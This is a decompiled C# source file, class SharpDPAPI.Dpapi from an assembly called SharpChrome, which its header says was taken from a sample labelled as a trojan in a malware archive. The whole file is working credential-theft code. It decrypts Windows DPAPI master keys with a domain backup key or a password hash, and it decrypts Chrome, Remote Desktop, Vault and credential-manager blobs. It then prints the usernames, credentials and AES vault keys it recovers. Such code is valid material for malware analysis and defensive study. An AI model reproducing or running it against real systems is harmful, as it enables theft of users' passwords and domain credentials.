// Decompiled with JetBrains decompiler
// Type: SharpDPAPI.Dpapi
// Assembly: SharpChrome, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D938FA4A-3611-4CA7-B3BE-AF9F6D845B7B
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\VHO-Trojan.MSIL.Convagent.gen-340a639e1ec7cb2afa90a2aba177b368e13efc4dd1313e32af30b6ceb259f7d3.exe

using PBKDF2;
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace SharpDPAPI
{
  public class Dpapi
  {
    public static Dictionary<string, string> PVKTriage(
      Dictionary<string, string> arguments)
    {
      Dictionary<string, string> dictionary1 = new Dictionary<string, string>();
      string str = arguments["/pvk"];
      if (string.IsNullOrEmpty(str))
      {
        Console.WriteLine("[X] /pvk:X must be a .pvk file or base64 encoded pvk representation");
        return dictionary1;
      }
      byte[] backupKeyBytes;
      if (File.Exists(str))
      {
        backupKeyBytes = File.ReadAllBytes(str);
      }
      else
      {
        try
        {
          backupKeyBytes = Convert.FromBase64String(str);
        }
        catch
        {
          Console.WriteLine("[X] Error base64 decoding /pvk:X !");
          return dictionary1;
        }
      }
      Console.WriteLine("[*] Using a domain DPAPI backup key to triage masterkeys for decryption key mappings!");
      Dictionary<string, string> dictionary2;
      if (arguments.ContainsKey("/server"))
      {
        dictionary2 = Triage.TriageUserMasterKeys(backupKeyBytes, computerName: arguments["/server"]);
      }
      else
      {
        Console.WriteLine("");
        dictionary2 = Triage.TriageUserMasterKeys(backupKeyBytes);
      }
      if (dictionary2.Count == 0)
      {
        Console.WriteLine("[!] No master keys decrypted!\r\n");
      }
      else
      {
        Console.WriteLine("[*] User master key cache:\r\n");
        foreach (KeyValuePair<string, string> keyValuePair in dictionary2)
          Console.WriteLine("{0}:{1}", (object) keyValuePair.Key, (object) keyValuePair.Value);
        Console.WriteLine();
      }
      return dictionary2;
    }

    public static byte[] DescribeDPAPIBlob(
      byte[] blobBytes,
      Dictionary<string, string> MasterKeys,
      string blobType = "credential",
      bool unprotect = false)
    {
      int sourceIndex1;
      if (blobType.Equals("credential"))
        sourceIndex1 = 36;
      else if (blobType.Equals("policy") || blobType.Equals("blob") || blobType.Equals("rdg") || blobType.Equals("chrome"))
      {
        sourceIndex1 = 24;
      }
      else
      {
        Console.WriteLine("[X] Unsupported blob type: {0}", (object) blobType);
        return new byte[0];
      }
      byte[] numArray1 = new byte[16];
      Array.Copy((Array) blobBytes, sourceIndex1, (Array) numArray1, 0, 16);
      string key1 = string.Format("{{{0}}}", (object) new Guid(numArray1));
      if (!blobType.Equals("rdg") && !blobType.Equals("chrome"))
        Console.WriteLine("    guidMasterKey    : {0}", (object) key1);
      int startIndex1 = sourceIndex1 + 16;
      if (!blobType.Equals("rdg") && !blobType.Equals("chrome"))
        Console.WriteLine("    size             : {0}", (object) blobBytes.Length);
      uint uint32 = BitConverter.ToUInt32(blobBytes, startIndex1);
      int startIndex2 = startIndex1 + 4;
      if (!blobType.Equals("rdg") && !blobType.Equals("chrome"))
      {
        Console.Write("    flags            : 0x{0}", (object) uint32.ToString("X"));
        if (uint32 != 0U && ((int) uint32 & 536870912) == (int) uint32)
          Console.Write(" (CRYPTPROTECT_SYSTEM)");
        Console.WriteLine();
      }
      int int32_1 = BitConverter.ToInt32(blobBytes, startIndex2);
      int index = startIndex2 + 4;
      string str = Encoding.Unicode.GetString(blobBytes, index, int32_1);
      int startIndex3 = index + int32_1;
      int int32_2 = BitConverter.ToInt32(blobBytes, startIndex3);
      int startIndex4 = startIndex3 + 4;
      int int32_3 = BitConverter.ToInt32(blobBytes, startIndex4);
      int startIndex5 = startIndex4 + 4;
      int int32_4 = BitConverter.ToInt32(blobBytes, startIndex5);
      int sourceIndex2 = startIndex5 + 4;
      byte[] numArray2 = new byte[int32_4];
      Array.Copy((Array) blobBytes, sourceIndex2, (Array) numArray2, 0, int32_4);
      int startIndex6 = sourceIndex2 + int32_4;
      int int32_5 = BitConverter.ToInt32(blobBytes, startIndex6);
      int startIndex7 = startIndex6 + (4 + int32_5);
      int int32_6 = BitConverter.ToInt32(blobBytes, startIndex7);
      int startIndex8 = startIndex7 + 4;
      if (!blobType.Equals("rdg") && !blobType.Equals("chrome"))
      {
        Console.WriteLine("    algHash/algCrypt : {0} ({1}) / {2} ({3})", new object[4]
        {
          (object) int32_6,
          (object) (Interop.CryptAlg) int32_6,
          (object) int32_2,
          (object) (Interop.CryptAlg) int32_2
        });
        Console.WriteLine("    description      : {0}", (object) str);
      }
      BitConverter.ToInt32(blobBytes, startIndex8);
      int startIndex9 = startIndex8 + 4;
      int int32_7 = BitConverter.ToInt32(blobBytes, startIndex9);
      int startIndex10 = startIndex9 + (4 + int32_7);
      int int32_8 = BitConverter.ToInt32(blobBytes, startIndex10);
      int sourceIndex3 = startIndex10 + 4;
      byte[] numArray3 = new byte[int32_8];
      Array.Copy((Array) blobBytes, sourceIndex3, (Array) numArray3, 0, int32_8);
      if (((blobType.Equals("rdg") || blobType.Equals("blob") ? 1 : (blobType.Equals("chrome") ? 1 : 0)) & (unprotect ? 1 : 0)) != 0)
      {
        byte[] optionalEntropy = new byte[0];
        try
        {
          return ProtectedData.Unprotect(blobBytes, optionalEntropy, DataProtectionScope.CurrentUser);
        }
        catch
        {
          return Encoding.Unicode.GetBytes(string.Format("MasterKey needed - {0}", (object) key1));
        }
      }
      else
      {
        if (MasterKeys.ContainsKey(key1))
        {
          switch (int32_6)
          {
            case 32772:
              try
              {
                byte[] sourceArray = Crypto.DeriveKey(Helpers.StringToByteArray(MasterKeys[key1].ToString()), numArray2, int32_6);
                byte[] key2 = new byte[int32_3 / 8];
                byte[] destinationArray = key2;
                int length = int32_3 / 8;
                Array.Copy((Array) sourceArray, (Array) destinationArray, length);
                return blobType.Equals("chrome") ? Crypto.DecryptBlob(numArray3, key2, int32_2, PaddingMode.PKCS7) : Crypto.DecryptBlob(numArray3, key2, int32_2);
              }
              catch
              {
                Console.WriteLine("    [X] Error retrieving GUID:SHA1 from cache {0}", (object) key1);
                break;
              }
            case 32782:
              try
              {
                byte[] sourceArray = Crypto.DeriveKey(Helpers.StringToByteArray(MasterKeys[key1].ToString()), numArray2, int32_6);
                byte[] key3 = new byte[int32_3 / 8];
                byte[] destinationArray = key3;
                int length = int32_3 / 8;
                Array.Copy((Array) sourceArray, (Array) destinationArray, length);
                return blobType.Equals("chrome") ? Crypto.DecryptBlob(numArray3, key3, int32_2, PaddingMode.PKCS7) : Crypto.DecryptBlob(numArray3, key3, int32_2);
              }
              catch
              {
                Console.WriteLine("    [X] Error retrieving GUID:SHA1 from cache {0}", (object) key1);
                break;
              }
            default:
              Console.WriteLine("    [X] Only sha1 and sha256 are currently supported for the hash algorithm. Alg '{0}' ({1}) not supported", (object) int32_6, (object) (Interop.CryptAlg) int32_6);
              break;
          }
        }
        else
        {
          if (blobType.Equals("rdg"))
            return Encoding.Unicode.GetBytes(string.Format("MasterKey needed - {0}", (object) key1));
          if (blobType.Equals("chrome"))
            return Encoding.ASCII.GetBytes(string.Format("MasterKey needed - {0}", (object) key1));
          Console.WriteLine("    [X] MasterKey GUID not in cache: {0}", (object) key1);
        }
        if (!blobType.Equals("rdg") && !blobType.Equals("chrome"))
          Console.WriteLine();
        return new byte[0];
      }
    }

    public static ArrayList DescribePolicy(
      byte[] policyBytes,
      Dictionary<string, string> MasterKeys)
    {
      int startIndex1 = 0;
      BitConverter.ToInt32(policyBytes, startIndex1);
      int sourceIndex1 = startIndex1 + 4;
      byte[] numArray1 = new byte[16];
      Array.Copy((Array) policyBytes, sourceIndex1, (Array) numArray1, 0, 16);
      Guid guid = new Guid(numArray1);
      int startIndex2 = sourceIndex1 + 16;
      Console.WriteLine("\r\n  VaultID            : {0}", (object) guid);
      int int32_1 = BitConverter.ToInt32(policyBytes, startIndex2);
      int index = startIndex2 + 4;
      string str = Encoding.Unicode.GetString(policyBytes, index, int32_1);
      int num = index + int32_1;
      Console.WriteLine("  Name               : {0}", (object) str);
      int startIndex3 = num + 12;
      BitConverter.ToInt32(policyBytes, startIndex3);
      int startIndex4 = startIndex3 + 4 + 32;
      int int32_2 = BitConverter.ToInt32(policyBytes, startIndex4);
      int sourceIndex2 = startIndex4 + 4;
      byte[] numArray2 = new byte[int32_2];
      Array.Copy((Array) policyBytes, sourceIndex2, (Array) numArray2, 0, int32_2);
      byte[] decBlobBytes = Dpapi.DescribeDPAPIBlob(numArray2, MasterKeys, "policy");
      if (decBlobBytes.Length == 0)
        return new ArrayList();
      ArrayList decPolicyBlob = Dpapi.ParseDecPolicyBlob(decBlobBytes);
      if (decPolicyBlob.Count == 2)
      {
        Console.WriteLine("    aes128 key       : {0}", (object) BitConverter.ToString((byte[]) decPolicyBlob[0]).Replace("-", ""));
        Console.WriteLine("    aes256 key       : {0}", (object) BitConverter.ToString((byte[]) decPolicyBlob[1]).Replace("-", ""));
        return decPolicyBlob;
      }
      Console.WriteLine("    [X] Error parsing decrypted Policy.vpol (AES keys not extracted)");
      return new ArrayList();
    }

    public static void DescribeVaultCred(byte[] vaultBytes, ArrayList AESKeys)
    {
      byte[] aesKey1 = (byte[]) AESKeys[0];
      byte[] aesKey2 = (byte[]) AESKeys[1];
      int num1 = 0;
      int num2 = 0;
      int startIndex1 = num1 + 16;
      int int32_1 = BitConverter.ToInt32(vaultBytes, startIndex1);
      int startIndex2 = startIndex1 + 4;
      long int64 = BitConverter.ToInt64(vaultBytes, startIndex2);
      int num3 = startIndex2 + 8;
      Console.WriteLine("\r\n    LastWritten      : {0}", (object) DateTime.FromFileTime(int64));
      int startIndex3 = num3 + 8;
      int int32_2 = BitConverter.ToInt32(vaultBytes, startIndex3);
      int index1 = startIndex3 + 4;
      string str = Encoding.Unicode.GetString(vaultBytes, index1, int32_2);
      int startIndex4 = index1 + int32_2;
      Console.WriteLine("    FriendlyName     : {0}", (object) str);
      int int32_3 = BitConverter.ToInt32(vaultBytes, startIndex4);
      int startIndex5 = startIndex4 + 4;
      int num4 = int32_3 / 12;
      Dictionary<int, int> dictionary = new Dictionary<int, int>();
      for (int index2 = 0; index2 < num4; ++index2)
      {
        int int32_4 = BitConverter.ToInt32(vaultBytes, startIndex5);
        int startIndex6 = startIndex5 + 4;
        int int32_5 = BitConverter.ToInt32(vaultBytes, startIndex6);
        startIndex5 = startIndex6 + 8;
        dictionary.Add(int32_4, int32_5);
      }
      byte[] destinationArray = new byte[vaultBytes.Length - 222];
      Array.Copy((Array) vaultBytes, 222, (Array) destinationArray, 0, destinationArray.Length);
      foreach (KeyValuePair<int, int> keyValuePair in dictionary)
      {
        int startIndex7 = keyValuePair.Value + 16;
        if (keyValuePair.Key >= 100)
          startIndex7 += 4;
        int int32_6 = BitConverter.ToInt32(vaultBytes, startIndex7);
        int startIndex8 = startIndex7 + 4;
        num2 = startIndex8;
        if (int32_6 > 0)
        {
          int num5 = BitConverter.ToBoolean(vaultBytes, startIndex8) ? 1 : 0;
          int num6 = startIndex8 + 1;
          if (num5 == 0)
          {
            byte[] numArray = new byte[int32_6 - 1];
            Array.Copy((Array) vaultBytes, num6, (Array) numArray, 0, int32_6 - 1);
            num2 = num6 + int32_6 - 1;
            Crypto.AESDecrypt(aesKey1, new byte[0], numArray);
          }
          else
          {
            int int32_7 = BitConverter.ToInt32(vaultBytes, num6);
            int sourceIndex1 = num6 + 4;
            byte[] numArray1 = new byte[int32_7];
            Array.Copy((Array) vaultBytes, sourceIndex1, (Array) numArray1, 0, int32_7);
            int sourceIndex2 = sourceIndex1 + int32_7;
            byte[] numArray2 = new byte[int32_6 - 1 - 4 - int32_7];
            Array.Copy((Array) vaultBytes, sourceIndex2, (Array) numArray2, 0, int32_6 - 1 - 4 - int32_7);
            num2 = sourceIndex2 + (int32_6 - 1 - 4 - int32_7);
            Dpapi.DescribeVaultItem(Crypto.AESDecrypt(aesKey2, numArray1, numArray2));
          }
        }
      }
      if (num4 <= 0 || int32_1 >= 4)
        return;
      int sourceIndex3 = num2 - 2;
      byte[] numArray3 = new byte[vaultBytes.Length - sourceIndex3];
      Array.Copy((Array) vaultBytes, sourceIndex3, (Array) numArray3, 0, numArray3.Length);
      int startIndex9 = 0 + 4;
      int int32_8 = BitConverter.ToInt32(numArray3, startIndex9);
      int startIndex10 = startIndex9 + 4;
      if (int32_8 > 2000)
      {
        Console.WriteLine("    [*] Vault credential clear attribute is > 2000 bytes, skipping...");
      }
      else
      {
        if (int32_8 <= 0)
          return;
        int num7 = BitConverter.ToBoolean(vaultBytes, startIndex10) ? 1 : 0;
        int num8 = startIndex10 + 1;
        if (num7 == 0)
        {
          byte[] numArray4 = new byte[int32_8 - 1];
          Array.Copy((Array) numArray3, num8, (Array) numArray4, 0, int32_8 - 1);
          Crypto.AESDecrypt(aesKey1, new byte[0], numArray4);
        }
        else
        {
          int int32_9 = BitConverter.ToInt32(numArray3, num8);
          int sourceIndex4 = num8 + 4;
          byte[] numArray5 = new byte[int32_9];
          Array.Copy((Array) numArray3, sourceIndex4, (Array) numArray5, 0, int32_9);
          int sourceIndex5 = sourceIndex4 + int32_9;
          byte[] numArray6 = new byte[int32_8 - 1 - 4 - int32_9];
          Array.Copy((Array) numArray3, sourceIndex5, (Array) numArray6, 0, int32_8 - 1 - 4 - int32_9);
          int num9 = sourceIndex5 + (int32_8 - 1 - 4 - int32_9);
          Dpapi.DescribeVaultItem(Crypto.AESDecrypt(aesKey2, numArray5, numArray6));
        }
      }
    }

    public static void DescribeVaultItem(byte[] vaultItemBytes)
    {
      int startIndex1 = 0;
      BitConverter.ToInt32(vaultItemBytes, startIndex1);
      int startIndex2 = startIndex1 + 4;
      int int32_1 = BitConverter.ToInt32(vaultItemBytes, startIndex2);
      int startIndex3 = startIndex2 + 4 + 4;
      for (int index = 0; index < int32_1; ++index)
      {
        int int32_2 = BitConverter.ToInt32(vaultItemBytes, startIndex3);
        int startIndex4 = startIndex3 + 4;
        int int32_3 = BitConverter.ToInt32(vaultItemBytes, startIndex4);
        int num = startIndex4 + 4;
        string str1 = Encoding.Unicode.GetString(vaultItemBytes, num, int32_3);
        byte[] numArray = new byte[int32_3];
        Array.Copy((Array) vaultItemBytes, num, (Array) numArray, 0, int32_3);
        startIndex3 = num + int32_3;
        switch (int32_2)
        {
          case 1:
            Console.WriteLine("    Resource         : {0}", (object) str1);
            break;
          case 2:
            Console.WriteLine("    Identity         : {0}", (object) str1);
            break;
          case 3:
            Console.WriteLine("    Authenticator    : {0}", (object) str1);
            break;
          default:
            if (Helpers.IsUnicode(numArray))
            {
              Console.WriteLine("    Property {0}     : {1}", (object) int32_2, (object) str1);
              break;
            }
            string str2 = BitConverter.ToString(numArray).Replace("-", " ");
            Console.WriteLine("    Property {0}     : {1}", (object) int32_2, (object) str2);
            break;
        }
      }
    }

    public static void DescribeCredential(
      byte[] credentialBytes,
      Dictionary<string, string> MasterKeys)
    {
      byte[] decBlobBytes = Dpapi.DescribeDPAPIBlob(credentialBytes, MasterKeys);
      if (decBlobBytes.Length == 0)
        return;
      Dpapi.ParseDecCredBlob(decBlobBytes);
    }

    public static void ParseDecCredBlob(byte[] decBlobBytes)
    {
      int startIndex1 = 0;
      int uint32_1 = (int) BitConverter.ToUInt32(decBlobBytes, startIndex1);
      int startIndex2 = startIndex1 + 4;
      int uint32_2 = (int) BitConverter.ToUInt32(decBlobBytes, startIndex2);
      int startIndex3 = startIndex2 + 4;
      int uint32_3 = (int) BitConverter.ToUInt32(decBlobBytes, startIndex3);
      int startIndex4 = startIndex3 + 4;
      int uint32_4 = (int) BitConverter.ToUInt32(decBlobBytes, startIndex4);
      int startIndex5 = startIndex4 + 4;
      int uint32_5 = (int) BitConverter.ToUInt32(decBlobBytes, startIndex5);
      int startIndex6 = startIndex5 + 4;
      long int64 = BitConverter.ToInt64(decBlobBytes, startIndex6);
      int startIndex7 = startIndex6 + 8;
      Console.WriteLine("    LastWritten      : {0}", (object) DateTime.FromFileTime(int64));
      int uint32_6 = (int) BitConverter.ToUInt32(decBlobBytes, startIndex7);
      int startIndex8 = startIndex7 + 4;
      int uint32_7 = (int) BitConverter.ToUInt32(decBlobBytes, startIndex8);
      int startIndex9 = startIndex8 + 4;
      int uint32_8 = (int) BitConverter.ToUInt32(decBlobBytes, startIndex9);
      int startIndex10 = startIndex9 + 4;
      int uint32_9 = (int) BitConverter.ToUInt32(decBlobBytes, startIndex10);
      int startIndex11 = startIndex10 + 4;
      int uint32_10 = (int) BitConverter.ToUInt32(decBlobBytes, startIndex11);
      int startIndex12 = startIndex11 + 4;
      int int32_1 = BitConverter.ToInt32(decBlobBytes, startIndex12);
      int index1 = startIndex12 + 4;
      string str1 = Encoding.Unicode.GetString(decBlobBytes, index1, int32_1);
      int startIndex13 = index1 + int32_1;
      Console.WriteLine("    TargetName       : {0}", (object) str1);
      int int32_2 = BitConverter.ToInt32(decBlobBytes, startIndex13);
      int index2 = startIndex13 + 4;
      string str2 = Encoding.Unicode.GetString(decBlobBytes, index2, int32_2);
      int startIndex14 = index2 + int32_2;
      Console.WriteLine("    TargetAlias      : {0}", (object) str2);
      int int32_3 = BitConverter.ToInt32(decBlobBytes, startIndex14);
      int index3 = startIndex14 + 4;
      string str3 = Encoding.Unicode.GetString(decBlobBytes, index3, int32_3);
      int startIndex15 = index3 + int32_3;
      Console.WriteLine("    Comment          : {0}", (object) str3);
      int int32_4 = BitConverter.ToInt32(decBlobBytes, startIndex15);
      int index4 = startIndex15 + 4;
      Encoding.Unicode.GetString(decBlobBytes, index4, int32_4);
      int startIndex16 = index4 + int32_4;
      int int32_5 = BitConverter.ToInt32(decBlobBytes, startIndex16);
      int index5 = startIndex16 + 4;
      string str4 = Encoding.Unicode.GetString(decBlobBytes, index5, int32_5);
      int startIndex17 = index5 + int32_5;
      Console.WriteLine("    UserName         : {0}", (object) str4);
      int int32_6 = BitConverter.ToInt32(decBlobBytes, startIndex17);
      int sourceIndex = startIndex17 + 4;
      byte[] numArray = new byte[int32_6];
      Array.Copy((Array) decBlobBytes, sourceIndex, (Array) numArray, 0, int32_6);
      int num = sourceIndex + int32_6;
      if (Helpers.IsUnicode(numArray))
        Console.WriteLine("    Credential       : {0}", (object) Encoding.Unicode.GetString(numArray));
      else
        Console.WriteLine("    Credential       : {0}", (object) BitConverter.ToString(numArray).Replace("-", " "));
    }

    public static ArrayList ParseDecPolicyBlob(byte[] decBlobBytes)
    {
      ArrayList decPolicyBlob = new ArrayList();
      if (Encoding.ASCII.GetString(decBlobBytes, 12, 4).Equals("KDBM"))
      {
        int startIndex1 = 20;
        int int32_1 = BitConverter.ToInt32(decBlobBytes, startIndex1);
        int sourceIndex1 = startIndex1 + 4;
        if (int32_1 != 16)
        {
          Console.WriteLine("    [X] Error parsing decrypted Policy.vpol (aes128len != 16)");
          return decPolicyBlob;
        }
        byte[] destinationArray1 = new byte[int32_1];
        Array.Copy((Array) decBlobBytes, sourceIndex1, (Array) destinationArray1, 0, int32_1);
        int num = sourceIndex1 + int32_1;
        BitConverter.ToString(destinationArray1).Replace("-", "");
        int startIndex2 = num + 20;
        int int32_2 = BitConverter.ToInt32(decBlobBytes, startIndex2);
        int sourceIndex2 = startIndex2 + 4;
        if (int32_2 != 32)
        {
          Console.WriteLine("    [X] Error parsing decrypted Policy.vpol (aes256len != 32)");
          return decPolicyBlob;
        }
        byte[] destinationArray2 = new byte[int32_2];
        Array.Copy((Array) decBlobBytes, sourceIndex2, (Array) destinationArray2, 0, int32_2);
        BitConverter.ToString(destinationArray2).Replace("-", "");
        decPolicyBlob.Add((object) destinationArray1);
        decPolicyBlob.Add((object) destinationArray2);
      }
      else
      {
        int index = 16;
        string str = Encoding.ASCII.GetString(decBlobBytes, index, 4);
        int num1 = index + 4;
        if (str.Equals("KSSM"))
        {
          int startIndex3 = num1 + 16;
          int int32_3 = BitConverter.ToInt32(decBlobBytes, startIndex3);
          int sourceIndex3 = startIndex3 + 4;
          if (int32_3 != 16)
          {
            Console.WriteLine("    [X] Error parsing decrypted Policy.vpol (aes128len != 16)");
            return decPolicyBlob;
          }
          byte[] destinationArray3 = new byte[int32_3];
          Array.Copy((Array) decBlobBytes, sourceIndex3, (Array) destinationArray3, 0, int32_3);
          int offset = sourceIndex3 + int32_3;
          BitConverter.ToString(destinationArray3).Replace("-", "");
          byte[] patternToFind = new byte[12]
          {
            (byte) 75,
            (byte) 83,
            (byte) 83,
            (byte) 77,
            (byte) 2,
            (byte) 0,
            (byte) 1,
            (byte) 0,
            (byte) 1,
            (byte) 0,
            (byte) 0,
            (byte) 0
          };
          int num2 = Helpers.ArrayIndexOf(decBlobBytes, patternToFind, offset);
          if (num2 != -1)
          {
            int startIndex4 = num2 + 20;
            int int32_4 = BitConverter.ToInt32(decBlobBytes, startIndex4);
            int sourceIndex4 = startIndex4 + 4;
            if (int32_4 != 32)
            {
              Console.WriteLine("    [X] Error parsing decrypted Policy.vpol (aes256len != 32)");
              return decPolicyBlob;
            }
            byte[] destinationArray4 = new byte[int32_4];
            Array.Copy((Array) decBlobBytes, sourceIndex4, (Array) destinationArray4, 0, int32_4);
            BitConverter.ToString(destinationArray4).Replace("-", "");
            decPolicyBlob.Add((object) destinationArray3);
            decPolicyBlob.Add((object) destinationArray4);
          }
          else
            Console.WriteLine("[X] Error in decrypting Policy.vpol: second MSSK header not found!");
        }
      }
      return decPolicyBlob;
    }

    public static byte[] GetDomainKey(byte[] masterKeyBytes)
    {
      int startIndex1 = 96;
      long int64_1 = BitConverter.ToInt64(masterKeyBytes, startIndex1);
      int startIndex2 = startIndex1 + 8;
      long int64_2 = BitConverter.ToInt64(masterKeyBytes, startIndex2);
      int startIndex3 = startIndex2 + 8;
      long int64_3 = BitConverter.ToInt64(masterKeyBytes, startIndex3);
      int startIndex4 = startIndex3 + 8;
      long int64_4 = BitConverter.ToInt64(masterKeyBytes, startIndex4);
      int sourceIndex = startIndex4 + 8 + (int) (int64_1 + int64_2 + int64_3);
      byte[] destinationArray = new byte[int64_4];
      Array.Copy((Array) masterKeyBytes, (long) sourceIndex, (Array) destinationArray, 0L, int64_4);
      return destinationArray;
    }

    public static byte[] GetMasterKey(byte[] masterKeyBytes)
    {
      int startIndex = 96;
      long int64 = BitConverter.ToInt64(masterKeyBytes, startIndex);
      int sourceIndex = startIndex + 32;
      byte[] destinationArray = new byte[int64];
      Array.Copy((Array) masterKeyBytes, (long) sourceIndex, (Array) destinationArray, 0L, int64);
      return destinationArray;
    }

    public static Dictionary<string, string> DecryptMasterKey(
      byte[] masterKeyBytes,
      byte[] backupKeyBytes)
    {
      Dictionary<string, string> dictionary = new Dictionary<string, string>();
      try
      {
        string key = string.Format("{{{0}}}", (object) Encoding.Unicode.GetString(masterKeyBytes, 12, 72));
        int startIndex1 = 4;
        byte[] domainKey = Dpapi.GetDomainKey(masterKeyBytes);
        int int32_1 = BitConverter.ToInt32(domainKey, startIndex1);
        int startIndex2 = startIndex1 + 4;
        int int32_2 = BitConverter.ToInt32(domainKey, startIndex2);
        int sourceIndex = startIndex2 + 4 + 16;
        byte[] numArray1 = new byte[int32_1];
        Array.Copy((Array) domainKey, sourceIndex, (Array) numArray1, 0, int32_1);
        Array.Copy((Array) domainKey, sourceIndex + int32_1, (Array) new byte[int32_2], 0, int32_2);
        byte[] numArray2 = new byte[backupKeyBytes.Length - 24];
        Array.Copy((Array) backupKeyBytes, 24, (Array) numArray2, 0, numArray2.Length);
        BitConverter.ToString(numArray2).Replace("-", "");
        BitConverter.ToString(numArray1).Replace("-", "");
        byte[] src = Crypto.RSADecrypt(numArray2, numArray1);
        int int32_3 = BitConverter.ToInt32(src, 0);
        BitConverter.ToInt32(src, 4);
        byte[] numArray3 = new byte[int32_3];
        Buffer.BlockCopy((Array) src, 8, (Array) numArray3, 0, int32_3);
        string str = BitConverter.ToString(new SHA1Managed().ComputeHash(numArray3)).Replace("-", "");
        dictionary.Add(key, str);
      }
      catch
      {
      }
      return dictionary;
    }

    public static Dictionary<string, string> DecryptMasterKeyWithSha(
      byte[] masterKeyBytes,
      byte[] shaBytes)
    {
      Dictionary<string, string> dictionary = new Dictionary<string, string>();
      try
      {
        string key = string.Format("{{{0}}}", (object) Encoding.Unicode.GetString(masterKeyBytes, 12, 72));
        byte[] masterKey = Dpapi.GetMasterKey(masterKeyBytes);
        int num = 4;
        byte[] numArray1 = new byte[16];
        Array.Copy((Array) masterKey, 4, (Array) numArray1, 0, 16);
        int startIndex1 = num + 16;
        int int32_1 = BitConverter.ToInt32(masterKey, startIndex1);
        int startIndex2 = startIndex1 + 4;
        int int32_2 = BitConverter.ToInt32(masterKey, startIndex2);
        int startIndex3 = startIndex2 + 4;
        int int32_3 = BitConverter.ToInt32(masterKey, startIndex3);
        int sourceIndex = startIndex3 + 4;
        byte[] numArray2 = new byte[masterKey.Length - sourceIndex];
        Array.Copy((Array) masterKey, sourceIndex, (Array) numArray2, 0, numArray2.Length);
        byte[] sourceArray1 = new byte[48];
        if (int32_2 == 32782)
        {
          using (HMACSHA512 algorithm = new HMACSHA512())
            sourceArray1 = new Pbkdf2((HMAC) algorithm, shaBytes, numArray1, int32_1).GetBytes(48);
          if (int32_3 == 26128 && int32_2 == 32782)
          {
            int length1 = new HMACSHA512().HashSize / 8;
            AesManaged aesManaged = new AesManaged();
            byte[] destinationArray1 = new byte[16];
            Array.Copy((Array) sourceArray1, 32, (Array) destinationArray1, 0, 16);
            byte[] destinationArray2 = new byte[32];
            Array.Copy((Array) sourceArray1, 0, (Array) destinationArray2, 0, 32);
            aesManaged.Key = destinationArray2;
            aesManaged.IV = destinationArray1;
            aesManaged.Mode = CipherMode.CBC;
            aesManaged.Padding = PaddingMode.Zeros;
            byte[] sourceArray2 = aesManaged.CreateDecryptor().TransformFinalBlock(numArray2, 0, numArray2.Length);
            int length2 = sourceArray2.Length;
            int length3 = length2 - 16 - length1;
            byte[] numArray3 = new byte[length1];
            Array.Copy((Array) sourceArray2, length2 - length3, (Array) numArray3, 0, numArray3.Length);
            using (SHA1Managed shA1Managed = new SHA1Managed())
            {
              string str = BitConverter.ToString(shA1Managed.ComputeHash(numArray3)).Replace("-", "");
              if (int32_2 == 32782)
              {
                byte[] numArray4 = new byte[16];
                Array.Copy((Array) sourceArray2, (Array) numArray4, 16);
                byte[] hash1 = new HMACSHA512(shaBytes).ComputeHash(numArray4);
                byte[] numArray5 = new byte[length3];
                Array.Copy((Array) sourceArray2, length2 - length3, (Array) numArray5, 0, length3);
                byte[] hash2 = new HMACSHA512(hash1).ComputeHash(numArray5);
                byte[] destinationArray3 = new byte[64];
                Array.Copy((Array) sourceArray2, 16, (Array) destinationArray3, 0, destinationArray3.Length);
                if (BitConverter.ToString(destinationArray3).Replace("-", "").Equals(BitConverter.ToString(hash2).Replace("-", "")))
                {
                  dictionary.Add(key, str);
                }
                else
                {
                  Console.WriteLine("[X] {0}:{1} - HMAC integrity check failed!", (object) key, (object) str);
                  return dictionary;
                }
              }
              else
              {
                Console.WriteLine("[X] Note: alg hash  '{0} / 0x{1}' not currently supported!", (object) int32_2, (object) int32_2.ToString("X8"));
                return dictionary;
              }
            }
          }
          else
          {
            Console.WriteLine("[X] Note: alg crypt '{0} / 0x{1}' not currently supported!", (object) int32_3, (object) int32_3.ToString("X8"));
            return dictionary;
          }
        }
        else
        {
          Console.WriteLine("[X] Note: alg hash  '{0} / 0x{1}' not currently supported!", (object) int32_2, (object) int32_2.ToString("X8"));
          return dictionary;
        }
      }
      catch
      {
      }
      return dictionary;
    }
  }
}
